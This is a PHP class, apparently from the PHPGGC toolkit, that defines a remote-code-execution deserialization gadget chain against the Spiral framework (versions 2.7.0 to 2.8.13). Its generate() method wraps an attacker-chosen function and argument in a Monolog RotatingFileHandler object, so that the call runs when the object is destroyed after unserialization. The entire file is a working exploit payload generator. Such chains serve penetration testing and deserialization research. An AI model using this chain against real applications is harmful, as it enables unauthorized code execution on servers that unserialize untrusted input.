<?php

namespace GadgetChain\Spiral;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.7.0 <= 2.8.13';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\RotatingFileHandler($function,$parameter);
    }
}